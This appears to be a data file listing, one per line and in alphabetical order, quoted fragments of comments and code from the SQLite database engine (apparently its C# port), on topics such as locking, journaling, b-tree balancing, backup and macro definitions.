" a==5 and b IN (1,2,3).  The current values for a and b will be stored"
" aMsg[rc] != """" )//(int)(sizeof(aMsg)/sizeof(aMsg[0]))"
" aRow might point to (ephemeral) data for the current row, or it might"
" about the preformance of SQLite, and optionally to reset various"
" about the status of a lock, or to break stale locks.  The SQLite"
" above, except that the parameter is required to be UTF-16 encoded, not"
" above, the mapping might go like this:  4.3, 5.1, 8.2, 29.0,"
" above, this function returns without doing anything. Otherwise, if"
" above. If this is the case, then the db->mallocFailed flag needs to"
" acceptable, as are their numeric equivalents: 0, 1 and 2 respectively."
" accessing this structure are really macros, so we can't really make"
" action (a reasonable assumption), then using this API may cause the"
" action, then we need to open all indices because we might need"
" actions: ROLLBACK, ABORT, FAIL, REPLACE, and IGNORE."
" actual on disk file is created lazily. When the file is created,"
" actually pageSize. Unlock the database, leave pBt.pPage1 at"
" added to the Schema structure and the Schema.db variable populated,"
" addr, p.aOp[i "
" address this, newer versions of SQLite (version 3.3.8 and later) include"
" affinity of that column is returned. Otherwise, 0x00 is returned,"
" affinity, use that. Otherwise use no affinity."
" after rollback of a hot-journal, or if an error occurs while opening"
" after seeing tokens ""CREATE"" and ""TABLE"" and the table name. The isTemp"
" again within this transaction, it will be marked as dirty but"
" against the Bitvec object.  If there are any differences,"
" aggregate takes. If this parameter is -1, then the SQL function or"
" aggregate, is encoded in UTF-8 for sqlite3_create_function() and UTF-16"
" aggregate, or 0 for min()."
" alias ""pcache1"". This ensures that the WSD emulation is used when"
" alias token.  If the term is a subquery, then pSubquery is the"
" all dirty pages are written to the database file,"
" all of SQLITE_OS_UNIX, SQLITE_OS_WIN, SQLITE_OS_OS2, and SQLITE_OS_OTHER"
" all that is required. Otherwise, if pCur is not open on an intKey"
" all the space together, however.  This routine will avoid using"
" allSpaces( pKey1, n, nKey1 - n ) "
" allSpaces( pKey2, n, nKey2 - n ) )"
" allocate enough space, just in case."
" allocated and initialized, then allocate and initialize it now."
" allocated by this function. If this is the case and an allocation fails,"
" allocated, a null pointer is returned. If the blob has already been"
" allocated, it is returned as normal."
" allocated, regardless of whether or not EP_Reduced is set."
" allocated, then ownership of P2 is transferred to the pseudo-cursor"
" allocation errors,  an error message held in memory obtained from"
" allocation fails, call sqlite3_result_error_nomem() to notify"
" allocation is being made in order to insert a new cell, so we will"
" allocation, especially if a corrupt database file has caused offset"
" allowed in an identifier.  For 7-bit characters,"
" allows functions such as ""regexp"" to compile their constant regular"
" alphanumeric characters, and no file extension. They are stored in the"
" already an allocation at pH.ht, then if this malloc() fails it"
" already exist, an error is returned.</dd>"
" already exists, it will be created to use the new encoding value."
" already expanded this SELECT.  However, if this is a subquery within"
" already held, or one of the transistions that the busy-handler"
" already hold a RESERVED lock on the database file, but it needs"
" already in the cache when this function is called, then the extra"
" already obtained a schema-lock, making the write-lock redundant."
" already, check for an MSVC build environment that provides"
" already.  However, if SQLite is compiled with the [SQLITE_OMIT_AUTOINIT]"
" also be no-ops, and any attempt to read the journal would return"
" also be used as the argument to a function, in which case the a.zName"
" also sets a flag in local variable ""flags"" to indicate the memory"
" always appropriate to call sqlite3_unlock_notify(). There is however,"
" always prefer case 1, so in that case we pretend that case 2 is not"
" always used to do, [sqlite3_step()] will automatically recompile the SQL"
" an ""ALTER TABLE <table-name> ADD"" statement is parsed. Argument"
" an ""INSERT INTO vacuum_db.xxx SELECT "
" an EXCLUSIVE lock. If such a lock is already held, no locking"
" an Expr object is truncated.  When EP_Reduced is set, then all"
" an IGNORE constraint, it jumps back to here."
" an INDEXED BY clause attached to this table, skip this step."
" an OP_HexBlob opcode, with the hex string representation of"
" an SQL-NULL value, return 0."
" an SQLITE_ERROR is returned.  Nothing else can go wrong, so otherwise"
" an abrupt power failure when synchronous is off, the database"
" an affinity change has occurred, then the cached value will only be"
" an entry of the FROM clause is a subquery instead of a table or view,"
" an error code, the BLOB is still closed."
" an error is returned.  If they are the same, zero is returned."
" an error occurs here, do not delete the master journal file."
" an error occurs, return the error code to the caller."
" an expression, sqlite3ResolveExprNames() will be called without a"
" an historical reference.  Most of the ""enhancements"" have been backed"
" an immediate jump to EofB.  Within EofA and EofB, and EOF on entry or"
" an index key, and thus ends with a rowid value.  The last byte"
" an interrupt is encountered, or until they are all done.  The 3rd parameter"
" an open journal-file, then the next time a shared-lock is obtained"
" an overflow cell, or if the cell was located on a different sibling"
" analysis, regardless of the outcome of the analysis.  Hence:"
" and 5 operands.  Operands P1, P2, and P3 are integers.  Operand P4"
" and UTF-16, so add a version for each to avoid any unnecessary"
" and Z.  Whenever one of the tokens X, Y, or Z is input to the parser"
" and a read-lock requested, we don't incorrectly downgrade the lock."
" and a regular journal file-handle. Note that a ""regular journal-handle"""
" and are also referred to as ""anonymous parameters""."
" and has the read-uncommitted flag set, then no lock is required."
" and heightOfSelect(), are used to determine the maximum height"
" and if the pager requires a journal-sync, then mark the page as"
" and modify the expression so that the next time it is evaluated,"
" and pId2 is the id.  If the left side is just ""id"" then pId1 is the"
" and passing it to [sqlite3_config()] during configuration, an"
" and played back, then SQLITE_OK is returned. If an IO error occurs"
" and reals) sorted numerically, followed by text ordered by the collating"
" and register P2 becomes ephemeral.  If the cursor is changed, the"
" and report database corruption if they were not, but this check has"
" and so if a schema change occurs, SQLITE_SCHEMA is returned by"
" and sqlite3_backup_step() returns [SQLITE_DONE]. Additionally, each time "
" and sqlite3_set_auxdata() APIs.  The ""auxdata"" is some auxiliary data"
" and that the value for ""i"" is within range of the Bitvec object."
" and the built-in [zeroblob] SQL function can be used, if desired,"
" and the common prefixes are equal, then key1 is less than key2."
" and the data is ""data""."
" and the data is given by (pData,nData).  The cursor is used only to"
" and the database was previously unlocked, then invoke the busy handler"
" and the device characteristics of the the file-system, as follows:"
" and the key value (a variable length integer, may have any value)."
" and the nArg parameter is -1, then only a function that accepts"
" and the number of that register is returned.  On subsequent calls,"
" and the preceding pointer are combined to form a ""Cell"".  Each"
" and the sequence is available in another text encoding, then that is"
" and the size of the block is ""size"" bytes."
" and the table is dropped by a different database connection, the"
" and the third argument passed to this function is true, the"
" and there are active VMs, then return SQLITE_BUSY. If a function"
" and there is no WHERE or LIMIT or GROUP BY or ORDER BY clauses, and"
" and this is a RELEASE command, then the current transaction"
" and this row has been seen before, then do not make this row"
" and try again, up to 100 times."
" and types will be used, so there is no need to test for namespace"
" and we are evaluating a join, then the constraint on column is"
" and we are in shared cache mode, then the open will fail with an"
" and write access. If it is zero, the BLOB is opened for read access."
" another error occurs, NULL is returned and an error message written into"
" any cells with overflow page pointers, then the corresponding pointer"
" any sqlite3_xxx API functions from within an unlock-notify callback, a"
" any value other than [SQLITE_IGNORE], [SQLITE_OK], or [SQLITE_DENY]"
" anywhere on the free-list, then it is guarenteed to be returned. This"
" apCell[] include child pointers.  Either way, all cells in apCell[]"
" apNew[1].pgno : 0, nNew >= 2 "
" apNew[2].pgno : 0, nNew >= 3 "
" apNew[3].pgno : 0, nNew >= 4 "
" apNew[4].pgno : 0, nNew >= 5 "
" apOld[1].pgno : 0,"
" appear to be quoted.  If the quotes were of the form ""..."" (double-quotes)"
" appears in the grammar, then ID becomes a fallback token for X, Y,"
" application receives an SQLITE_LOCKED error, it may call the"
" application to deadlock. For example, if connection X is waiting for"
" application wishes to abandon the backup operation, the [sqlite3_backup]"
" applications that relink against newer versions of SQLite, the"
" are NULL, return 0."
" are allocated, zeroed, and returned to the caller. For each subsequent"
" are always destroyed.  To destroy all auxdata entries, call this"
" are appropriate for use on OS/2, Unix, and Windows."
" are built into SQLite when it is compiled for unix, windows, or os/2."
" are changed as side effects of [REPLACE] constraint resolution,"
" are considered to be equal.  Otherwise, the longer key is the"
" are contained within the same memory allocation.  Note, however, that"
" are converted into ""Y op X""."
" are destroyed. If this is a release operation (op==SAVEPOINT_RELEASE),"
" are either constant throughout the lifetime of the pager, or else"
" are found, return a pointer to the last table."
" are indices to be copied and the destination is not empty,"
" are intended to always be true or false, respectively.  Such"
" are intentually left unused.  This is the ""reserved"" space that is"
" are made to the database file, though writes to the rollback"
" are no active VMs, invalidate any pre-compiled statements."
" are no active cursors, it also releases the read lock."
" are no active savepoints and no other statement-transactions open,"
" are no more pages to copy, then [SQLITE_DONE] is returned. If an error "
" are not able to use a "","" as the decimal point in place of ""."" as"
" are not allowed to refer to any names, so pass an empty NameContext."
" are not strictly a part of the filesystem, but they are"
" are of different types, then numbers are considered less than"
" are pending, then the results are undefined."
" are placed in aBtree[] in order of aBtree[].pBt.  That way,"
" are released, a rollback occurs and the lock on the database is"
" are stored in the Pager.aSavepoint[] array, which is allocated and"
" are text, then the appropriate collating function specified in"
" are used, the lock is placed on the same range of bytes that is used"
" are walked without any actions being taken at each node.  Presumably,"
" are within range. To be 'in range', both values need to be a power"
" area, according to the page header, lies within the page."
" argument is P4_KEYINFO_HANDOFF, the passed in pointer is used.  It still"
" argument is SQLITE_STATIC, it means that the content pointer is constant"
" argument list is a NULL pointer, %Q substitutes the text ""NULL"" (without"
" argument.  If it is NULL, this is the same as deleting the collation"
" argument.  If the argument is numeric, the return value is the same as"
" argument. An expression with no children, Expr.x.pList or"
" argv[0] == """" )"
" array if it is missing.  If pTab is already in the array, this routine"
" array. Otherwise, if the page is loaded and written again in"
" array. Return the error code for the first error that occurs, or"
" as (B) we only store (A), then duplicate (A) when pulling"
" as an undeclared column named ROWID, OID, or _ROWID_ as long as those"
" as appropriate. Otherwise, SQLITE_OK."
" as clean, since there will be no need to write it out to the."
" as if there was an ""ORDER ON x"" or ""ORDER ON x DESC"" clause."
" as its second argument. If the third parameter, discard, is non-zero,"
" as opcodes here.  For example, the parser defines TK_GE to be an integer"
" as part of the ""Secure CRT"". It is essentially equivalent to"
" as stated in the previous paragraph, sqlite3_step() invokes"
" as the first argument to the UTF-8 comparison function, xCmp."
" as the list of ""expr AS ID"" fields following a ""SELECT"" or in the"
" as the orconf member. If this is OE_Default, then the ON CONFLICT clause"
" as we can without disabling too much.  If we disabled in (1), we'd get"
" assert() is disabled, then the return value is zero.  If X is"
" associated storage, so all we have to do is copy their entries"
" at a Schema struct. This function does not call //sqlite3DbFree(db, ) on the"
" at the btree level, in case the sqlite_sequence table needs to"
" at the end of the file. If there is, and that master journal file"
" atomic-write optimization is enabled in this build, then isDirect"
" attempt to keep related pages close to each other in the database file,"
" authorizer callback is the name of the database (""main"", ""temp"","
" automatically by sqlite3_complete16().  If that initialization fails,"
" automatically when they are closed. If zFilename is "":memory:"" then"
" b = b >> 1, n"
" b-tree database, the connection is holding the required table locks,"
" b-tree structure by one. This is described as the ""balance-shallower"""
" b-tree with root page iRoot. If so, true is returned. Otherwise, false."
" b-trees, this is just the root page of the b-tree being read or"
" back and different changes are made in their place, then when this"
" back any content.  If the journal is merely persistent, no reset is"
" backed temporary databases, 2 for the Red-Black tree in memory database"
" backed up to is not accessed by any connection within the process,"
" backup is complete, it returns [SQLITE_OK]. If no error occured and there "
" backwards compatibility with older code, these functions continue "
" balance_nonroot(), or just before this function returns, whichever"
" baseCur, pIdx.tnum, iDb,"
" be NULL, representing an empty list. In this case this function is"
" be a root-page number, less one again if that is the"
" be a separate OP_VRowid opcode for use with virtual tables, but this"
" be attempted, then this routine returns FALSE."
" be cleared before returning. Do this directly, instead of via"
" be converted directly into a value, then the value is allocated and"
" be created, and that it is an error if it already exists."
" be dealt with by this routine. Some of these have been set already, but"
" be defined locally, but now we use the varint routines in the util.c"
" be entered multiple times by the same thread.  In such cases the,"
" be inserted.  The parameter ""x"" must have been obtained from"
" be modified, as  follows:"
" be obtained, SQLITE_BUSY is returned."
" be possible to restore its contents when the ""ROLLBACK TO one"""
" be represented, even though julian day numbers allow a much wider"
" be restored to its current value when the ""ROLLBACK TO sp"" is"
" be returned. This is used by the built-in min(), max() and nullif()"
" be significantly slower than contiguously writing data to the file,"
" be so out of balance as to be illegal.  For example, the right-most"
" be used in place of a temp.table, it must be ordered according"
" be used to cache database pages read from a file stored on disk, or"
" be used, for example, to add a regular-expression matching scalar"
" be written to, store pPg.pgno in local variable needSyncPgno."
" be: nil, nil, nil, A, B."
" became arbitrary expressions, we were forced to add restrictions (13)"
" becomes a new pointer-map page, the second is used by the caller."
" been compiled correctly.  It is important to run this code, but"
" been corrected, so be it. Otherwise, after balancing the leaf node,"
" been released, the function returns. The return value is the total number"
" been set for the Nth argument of the function, or if the corresponding"
" before calling APIs that follow, extension should check the"
" before that point, jump to error_out."
" before the transaction was committed, then the change-counter"
" before this API is called, a new function is created.  The implementation"
" begins at ""offset""."
" being read from the database. Additionally, the bits corresponding"
" being rolled back), then the rollback consists of up to three stages,"
" being used for an in-memory database, this function is a no-op."
" below is always a no-op and cannot fail.  We will run it anyhow, though,"
" below, after all of the result-sets for all of the elements of"
" better done in-line.  If we factor them, they will just end"
" bit clear.  Except, if we get to the 9th byte, it stores the full"
" bitmask tests, testcase() can be used to make sure each bit"
" bits in the Bitmask.  So, in the example above, the cursor numbers"
" blob, or NULL.  But it needs to be an integer before we can do"
" block deals with cases 3 and 4 and the one after that, case 5. Since"
" block.  If there were no changes, this block is skipped."
" blocked connection already has a registered unlock-notify callback,"
" blocking transaction. In either case, invoke the notify callback"
" boolean, which enables or disables the collection of memory allocation "
" brackets from around identifers.  For example:  ""[a-b-c]"" becomes"
" btreeParseCellPtr(). Using some compilers, this will be faster."
" buffer pBuf). If it is non-zero, a write (data copied from"
" buffer, excluding the terminating null char."
" builds) or a function call (for debugging).  If it is a function call,"
" busy callback returns 0, then no additional attempts are made to"
" busy-handler returns non-zero before the lock is available, then "
" but it does not parse, the type of the token is changed to ID and"
" but the most recent API call succeeded, the return value from"
" by 0, 1, or 3 operands, depending on the opcode.  Another"
" by [sqlite3_prepare()] or its variants [sqlite3_prepare_v2()],"
" by [sqlite3_prepare_v2()], [sqlite3_step()], and [sqlite3_finalize()]."
" by a linear search of the global list.  For small tables, the"
" by an sqlite3_step() call. If there is a blocking connection, then the"
" by calling //sqlite3DbFree(db, )."
" by extending the file), the current page at position pgnoMove"
" by indices, we disable them to prevent redundant tests in the inner"
" by pNew. This is either EXPR_FULLSIZE, EXPR_REDUCEDSIZE or"
" by sqlite3_step().  The use of the ""v2"" interface is recommended."
" by the [xFilter], [xNext], [xEof], [xColumn], and [xRowid] methods"
" by the aiColumn[] field of this structure.  For example, suppose"
" by the backup operation, then the backup database is transparently "
" by the compiler. Instead, the compiler layer specifies"
" by this structure are not required to handle this case, the results"
" by this vdbe program, lock it for writing at the shared-cache level."
" byte order.  Or, that if SQLITE_MIXED_ENDIAN_64BIT_FLOAT is"
" byte swapping becomes very complicated.  To avoid problems,"
" byte-swapping, it just sets Mem.enc appropriately."
" bytes and N bytes in size, where N is the value of the 2nd parameter."
" bytes in length. This means the database cannot be opened,"
" bytes in size, more than one call to sqlite3OsWrite() may be required"
" bytes in the string, not the number of characters."
" bytes, then it may actually be smaller than this"
" c = sqlite3Utf8Read(zIn, zTerm, (const u8"
" c == '""' "
" cache is enabled, the [sqlite3_create_module()] API used to register"
" cache zero or negative rowids, which means tables that use zero or"
" call above, but then delete the journal and drop the lock before"
" call to balance() repairs the tree, and the if(...) condition is"
" call to pager_unlock() will discard all in-memory pages, unlock"
" call to pager_unlock(), as described above."
" call to sqlite3_mutex_held() to fail, so a non-zero return is"
" call, depending on the object being opened:"
" callback on p, but do invoke it on each FROM clause subquery"
" callback on the conclusion of connection B's transaction, and connection"
" callback only, NULL pointers should be passed as the xStep and xFinal"
" callbacks with smaller arrays of context pointers, which will"
" called a ""soft"" limit.  It is advisory only."
" called in response to a user action such as pressing ""Cancel"""
" called is identified by the second argument, ""offset"", which is"
" called with a NULL pointer as its second argument, then any existing"
" called), set the database error in this case as well."
" called, just return the same error code without doing anything. "
" called. Because of the previous sentence,"
" caller should not free the allocation, it will be freed when the Vdbe is"
" callgrind, this causes a certain test case to hit the CPU 4.7"
" calling balance_nonroot() (balance_deeper() may be called first,"
" calling the xDestroy() method, SQLite considers the [sqlite3_pcache"
" calls to [sqlite3_open()], [sqlite3_open_v2()], and [sqlite3_open16()]."
" calls to sqlite3_column_blob(), sqlite3_column_text(), and/or"
" calls to sqlite3_get_auxdata() might return this data, if it has"
" calls to this routine should not block, of course.  Otherwise the"
" can be checked before any changes are made to the database, it is never"
" can be integers, floating point values, strings, BLOBs, or NULL."
" can be set to 'off' for this file, as it is not recovered if a crash"
" can be translated into a 32-bit integer, then the token is not"
" can be used, a single callback function may be registered with the"
" can be used.  The zTable variable is the name of the table (the ""Y"").  This"
" can result in a ""no such table: sqlite_master"" or ""malformed"
" cannot be converted to a value, then ppVal is set to NULL."
" cannot be found, an [error code] is returned and an error message left"
" cannot free sufficient memory to prevent the limit from being exceeded,"
" case 1.  In that case, construct a new virtual term that is"
" case of a subroutine, the subroutine itself is responsible for"
" case statement is followed by a comment of the form ""/"
" case the database must already exist, otherwise an error is returned.</dd>"
" case where writable static data is supported, wsdHooks can refer directly"
" case where writable static data is supported, wsdPrng can refer directly"
" case where writable static data is supported, wsdStat can refer directly"
" case, but that type is not available on all compilers, or"
" case, we need to return right away and not make any changes to"
" case-indendent fashion, using the same definition of case independence "
" case-sensitive, take advantage of that by uppercasing the mutex name"
" categories, then eOperator==0.  The WhereTerm.pExpr field is still set"
" caused by an INSERT, DELETE, or UPDATE statement.  Rows that"
" cell in page pParent. Or, if iIdx is equal to the total number of"
" cell pointer array, and the cell content area.  Page 1 also has a 100-byte"
" cell. If SQLITE_DEBUG is defined, an Debug.Assert() at the bottom of"
" cells in pParent, that page number iChild is the right-child of"
" change count, and the current statement change count."
" change the way it deals with files.  For example, an application"
" change-counter, stored as a 4-byte big-endian integer starting at"
" changes in the most recently completed INSERT, UPDATE, or DELETE"
" changes.  If a rollback is needed, then do the rollback."
" character is exactly one byte in size.  Also, all characters are"
" characters between zSql8 and zTail8, and then returning a pointer"
" characters, does not begin with a digit and is not an SQL keyword,"
" checkColumnOverlap( p.pColumns, pChanges ) != 0 )"
" checks out, these routines return 0."
" child page into the parent, decreasing the overall height of the"
" child pointers.  If siblings are not leaves, then all cell in"
" chngToIN will hold either 0, 1, or 2 bits.  The 0-bit case means"
" cid:        Column id (numbered from left to right, starting at 0)"
" clause subexpression is separated from the others by AND operators,"
" clause that refer to the ROWID, then we will never be able to do"
" clause, the cursor numbers might not begin with 0 and they might"
" clause.  If it can, it returns 1.  If pIdx cannot satisfy the"
" cleared), but if that is not possible settle for any other"
" clients on win95, winNT, and unix all talking to the same shared file"
" code representing the "">="" operator.  This same integer code is reused"
" code to the caller is insufficient, as even if an error code"
" code.  Better to leave the code out, we think."
" coded, its associated TriggerStack instance is pointed to by the"
" coding the ""ALTER TABLE ... ADD"" statement."
" collapse free space, etc.  It is modelled after the VACUUM command"
" collation sequence with name zName, length nName."
" collationMatch( zColl, pIndex ) )"
" column (i==1), and a NULL pointer for the first result column (i==0)."
" column index is out of range, the result is undefined."
" column specific strings, in case the schema is reset before this"
" column to be updated, make sure we have authorization to change"
" columnIndex( pRightTab, zName ) < 0 )"
" columns of the table to see if any of them contain the token ""hidden""."
" columns, then the original expression is unchanged and a new virtual"
" command. If the latter, then the row-records in the table btree on disk"
" comments following the ""case"" for each opcode in the vdbe.c"
" comparison is inverted. For the max() aggregate, the"
" comparison is made. If the SQLITE_AFF_MASK is 0x00, then numeric"
" comparison"". SQLite's knowledge of upper and lower case equivalents"
" compile the first statement in zSql, so "
" compile-time option, then the automatic calls to sqlite3_initialize()"
" compiled, or [SQLITE_DENY] to cause the entire SQL statement to be"
" complete, since there may still exist Expr.pTab entries that"
" completed execution when this routine is called, that is like"
" completely fill the hash, then just add it without "
" complexity.  Because N is just a guess, it is no great tragedy if"
" complicated default expression value was provided, it is evaluated"
" condition/decision coverage is inadequate.  For example, testcase()"
" conditions above is not true, the pager was in error state when this"
" configured maximum pager number, increase the allowed limit so"
" configured soft-heap-limit to be breached, it will be possible to"
" confusion because the term ""temp table"", might refer either"
" connection Y's transaction to be concluded, and similarly connection"
" connection handle pSrcDb to zDestDb in pDestDb. If successful, return"
" connection internally, then SQL functions must be added individually to"
" connection while this routine is running, then the return value"
" connection, then this operation is a no-op.  No statement transaction"
" connection.  The third argument is one of [SQLITE_UTF8], [SQLITE_UTF16BE],"
" connections, then the source database connection may be used concurrently"
" construct ""indexed_opt"" for details. "
" contains no NULL values, then the result is 0. If the set"
" contains one or more NULL values, then the result of the"
" contains the '.' character or an ""E"
" content of the page. However, since this content is not present in either"
" context is checked.  If there is still no match, the next context"
" context is searched first.  If no match is found, the next outer"
" context, i64 nByte )"
" contiguous or in order, but cell pointers are contiguous and in order."
" continuing.  Transactions still work if synchronous is off,"
" continuously for the entire operation. Thus, the backup may be"
" conversions have occurred as described below.  After a type conversion,"
" cookie.  Thereafter, whenever it goes to access the database,"
" copied into the destination database, then the data written to the"
" correct and the middle be corrupt.  Thus, this ""checksum"" scheme,"
" corresponding to page iPage handy, it may pass it as the second value."
" corrupted, SQLITE_DONE is returned. Data is considered corrupted in"
" count does not include rows of views that fire an [INSTEAD OF trigger],"
" count, and the current statement change count."
" crashes, then an instance of SQLite compiled with the default page-size"
" created by a process other than this one, then this routine"
" created by this VDBE, from the sqlite_master table. It only"
" created so far, so the new root-page is (meta[3]"
" created, populated with this journal pointer and synced to disk."
" created. SQLite doesn't use it to indicate ""exclusive access"""
" creates N-1 copies of the parent query without any ORDER BY, LIMIT or"
" creating a new [virtual table] using the module, or before using a"
" current content of the cell is preserved. Otherwise, it may"
" current sqlite3_prepare() operation will fail, but the following one"
" current value of Pager.dbSize, set dbSize back to the value"
" currently is, so detect this case and write a single zero byte to"
" currently less than nSavepoints open, then open one or more savepoints"
" currently open, this instruction is a no-op."
" cursor 1 is managed by memory cell (p.nMem-1), etc."
" cursor entry uses one or more overflow pages, this function"
" cursor from other VMs in different database connections,"
" cursor number ""baseCur"".  All indices of pTab must also have open"
" cursors:  4, 5, 8, 29, 57, 73.  Then the  WhereMaskSet structure"
" custom page cache using this API, an application can control more "
" data header and the local payload, but not any overflow page or"
" database ""xxx"" is returned."
" database before the transaction began, in pages. Also, pPager.cksumInit"
" database changes.  After each schema change, the cookie value"
" database connections for the meaning of ""modify"" in this paragraph."
" database connections, even when the rest of the in-memory database "
" database connections.  After initialization, this table is"
" database connections.  But as this is a deprecated interface, we"
" database file, detect the RESERVED lock, and conclude that the"
" database file, then it either needs to be played back or deleted."
" database file. If there is already an EXCLUSIVE lock, the following"
" database handle object, it does not close any savepoints that may be open"
" database name prefix.  Like this:  ""database.table"".  The pDatabase"
" database schema"" error being returned to the user."
" database, mark the database as read-only.  "
" database, table, and column."
" database, then root page 5 would be moved to page 4 by the"
" database. If the database is not initialized, it is initialized now."
" database. {H11303} To control the main database file, use the name ""main"""
" date is already on the appropriate weekday, this is a no-op."
" dates afterwards, depending on locale.  Beware of this difference."
" day of the month - [1,31] "
" days since January 1 - [0,365] "
" days since Sunday - [0,6] "
" db for collation type name zName, length nName, or NULL, if no collation"
" db is not currently a part of the list, this function is a no-op."
" db,            /"
" db,"
" db. If a transaction is active, commit it. If there is a"
" db.aDb[i].zName : null,"
" dbSizeValid, dbSize, dbOrigSize, dbFileSize"
" dealt with in the previous code block.  Besides these, the only"
" decendents of the SELECT, including compounds off of p.pPrior,"
" default setting.  If the return value is 1, then ALWAYS() is either"
" default value. Except, if the call to BtreeOpen() returned a handle"
" defer the handling of t1.x=5, it will be processed immediately"
" define //sqlite3StackFree(D,P)       //sqlite3DbFree(D,P)"
" define //sqlite3StackFree(D,P)"
" define CODEC1(P,D,N,X,E)   /"
" define CODEC1(P,D,N,X,E) "
" define CODEC2(P,D,N,X,E,O) "
" define CODEC2(P,D,N,X,E,O) O=(char"
" define MIN(x,y) ((x)<(y)"
" define SAVE_SZ  (Parse.Length - offsetof(Parse,nVar))"
" define SET_FULLSYNC(x,y)"
" define SQLITE_TEMP_FILE_PREFIX ""etilqs_"""
" define autoIncBegin(A,B,C) (0)"
" define autoIncStep(A,B,C)"
" define likely(X)    __builtin_expect((X),1)"
" define sqlite3AuthCheck(a,b,c,d,e)    SQLITE_OK"
" define sqlite3AuthContextPush(a,b,c)"
" define sqlite3AuthRead(a,b,c,d)"
" define sqlite3BtreeMutexArrayInsert(X,Y)"
" define sqlite3CodeRowTrigger(A,B,C,D,E,F,G,H,I,J,K,L) 0"
" define sqlite3DeleteTrigger(A,B)"
" define sqlite3DropTriggerPtr(A,B)"
" define sqlite3StackAllocRaw(D,N)   alloca(N)"
" define sqlite3StackAllocRaw(D,N)   sqlite3DbMallocRaw(D,N)"
" define sqlite3StackAllocZero(D,N)  memset(alloca(N), 0, N)"
" define sqlite3StackAllocZero(D,N)  sqlite3DbMallocZero(D,N)"
" define sqlite3TriggerList(X, Y) 0"
" define sqlite3TriggersExist(B,C,D,E,F) 0"
" define sqlite3UnlinkAndDeleteTrigger(A,B,C)"
" define sqlite3Utf8Read(A,C)    ("
" define sqlite3ViewGetColumnNames(A,B) 0"
" define sqliteViewResetAll(A,B)"
" define unlikely(X)  __builtin_expect((X),0)"
" definitely roll back, so just return SQLITE_OK and report a (nul)"
" deleted out from under the cursor and if it has, mark the row as"
" depending on the circumstances, and the"
" depending on the value of parameter createFlag (which may be 0, 1 or 2)."
" dequoted string, exclusive of the zero terminator, if dequoting does"
" described above, or until [sqlite3_step()] or [sqlite3_reset()] or"
" deserialize the value from the record. If aOffset[p2] is zero,"
" device characteristics (sector-size and atomic write() support),"
" dflt_value: The default value for the column, if any."
" direct mode, page 1 is always held in cache and hence the PagerGet()"
" directly, we use its constant as a key to lookup the run-time allocated"
" discard the database schema, as the user code implementing the"
" disk and we are still holding all locks, so the transaction has not"
" diskPath.ToString().Remove( diskPath.Length - 1, 1 ) "
" do any kind of error recovery.  Instead, simply invoke the syntax"
" do not try to access data they are not allowed to see, or that they do not"
" do rollbacks or ABORT processing, or [DROP TABLE] processing.  The"
" do so without loss of information.  In other words, if the string"
" do so. If this operation returns an error, and the current statement"
" documentation, headers files, or other derived files.  The formatting"
" does match this pattern, then a pointer to the Table object representing"
" does not control the string, it might be deleted without the register"
" does not exist, then the journal file is not really hot. In this"
" does not have to do anything special based on the value of bPurgeable,"
" does not matter.  But there might be a LIMIT clause, in which"
" does not provide a suitable implementation. In this case, the user"
" does, then we can assume that it consumes less space on disk and"
" doing any work. To avoid thwarting these optimizations, it is important"
" doing coverage testing, the condition inside the argument to"
" double.  If pMem is already a double or an integer, return its"
" drawn, the size of each scratch allocation (sz),"
" driver.  If zFilename is the name of a file, then that file is"
" dupedExprSize( p.pRight, flags )"
" during a Movepage() call, then the page may not be in the cache"
" eType = sqlite3FindInIndex( pParse, pX, ref iDummy )"
" each child journal, it checks if:"
" each instruction in the VDBE.  When reaches zero, the u1.isInterrupted"
" each nested trigger stores its parent trigger's TriggerStack as the ""pNext"""
" each represented by a (length, data) pair and encoded in the encoding"
" each row into a sorting index, terminate the first loop,"
" early in the code, before we know if any database tables will be used."
" either an integer, a null-terminated string, a floating point"
" either case, SQLITE_TOOBIG is returned."
" either in this process or in some other process, is holding a RESERVED,"
" either side of pPage. More siblings are taken from one side, however,"
" element corresponding to ""key"" is removed from the hash table."
" element.  Max is BITVEC_NINT.  For BITVEC_SZ of 512,"
" elements in pEList, corresponding to the matching entry.  If there is"
" else Array.Resize( ref p.aOp, nNew )"
" else z.Remove( 0, 9 )"
" embedded systems, and when it does the developers normally have bigger"
" enabled at compile time, the compiler can omit the tests of"
" enabled, some Debug.Asserts below will ensure that the byte order of"
" encoded in UTF-8. {H16703} If sqlite3_collation_needed16() is used,"
" encoded string to UTF-8, then invoking sqlite3_prepare(). The"
" encoding identified by the string zName, length nName."
" encoding is used, then the fourth argument should be [SQLITE_ANY]."
" encoding, or if pMem does not contain a string value."
" encountered, then an appropriate error message is left in"
" encounters a constraint violation, it does not fail.  The"
" encrypted, this routine will encrypt it.  If pNew==0 or nNew==0, the"
" end of a growing FROM clause.  The ""p"" parameter is the part of"
" end of the file and, if successful, copies it into memory supplied"
" ensure that statement-transactions are always nested, not overlapping."
" entries are in the table, use 1 million as a guess."
" entry for the first required overflow page is valid, skip"
" entry in the table, and the next row inserted has an integer key"
" equal SQLITE_SYNC_NORMAL, that means to use normal fsync() semantics."
" equal to nSavepoint, then this function is a no-op."
" equal to, or greater than the P2 vector, respectively."
" equal to, or greater than the second string. i.e. (STRING1 - STRING2)."
" equal, then the keys are considered to be equal and"
" error ""At most one of the following compile-time configuration options"
" error ""Must not define both SQLITE_OMIT_DECLTYPE and SQLITE_ENABLE_COLUMN_METADATA"""
" error ""The MEMORY_DEBUG macro is obsolete.  Use SQLITE_DEBUG instead."""
" error code if the attempt to write to the sub-journal fails, or"
" error code is SQLITE_OK or SQLITE_CONSTRAINT, then set the error"
" error has occured, then return the error code in p.rc to the"
" error is encountered, then the IO error code is returned to the caller."
" error occurs during this process, or if the requested table or column"
" error occurs within the statement, the effect of that one statement"
" error occurs, write an error message into pzErrMsg."
" error, return ((unsigned int)-1)."
" error, then it might not have been halted properly.  So halt"
" error. Otherwise, do nothing."
" escarg == ""NULL"
" etc. A value of 0 in the aOverflow[] array means ""not yet known"""
" evaluated outside of any trigger.  This is the ""top level"""
" even empty strings, are always zero terminated.  The return"
" even the public interface to SQLite, can use a pointer to this structure."
" even though the freeblock list was checked by btreeInitPage(),"
" ever reading the table.  If that is the case, then halve the"
" ever since.  The blame is not necessarily with GCC, though."
" ever transformed, so there is never anything to delete."
" exact match for the name, number of arguments and encoding, then add a"
" exactly iSize bytes. If pFile is not larger than iSize bytes, then"
" example, an application may allow a user to enter arbitrary"
" example, if the SQL is this:"
" example, if the internal representation is FLOAT and a text result"
" example, the third ""c"" value is an inequality.  So only two"
" example, when inserting data into a table with auto-generated integer"
